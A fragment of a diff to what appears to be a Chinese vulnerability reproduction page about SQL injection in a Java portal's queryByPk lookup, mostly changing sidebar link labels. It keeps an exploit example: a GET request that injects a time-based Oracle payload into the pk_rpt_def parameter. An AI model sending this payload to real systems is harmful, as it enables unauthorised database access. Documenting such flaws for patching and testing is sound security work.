@@ -65,15 +65,13 @@ public class PsnCardAction extends BaseAction {
 
 深入探索
 
-Web安全课程
+客户关系管理
 
-Windows安全工具
+网络设备
 
-安全监控系统
+软件
 
 `pk_rpt_def` 带入 queryByPk 函数
-
-漏洞利用分析
 
 ```
 public RepDefVO queryByPk(String pk) throws BusinessException {
@@ -110,8 +108,6 @@ public Collection retrieveByClause(Class className, String condition, String[] f
 # 漏洞复现
 
 漏洞利用示例
-
-网络
 
 ```
 GET /portal/pt/viewPsnCard/download?pageId=login&pk_rpt_def=1'+and+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)--&pk_psnjob=1 HTTP/1.1
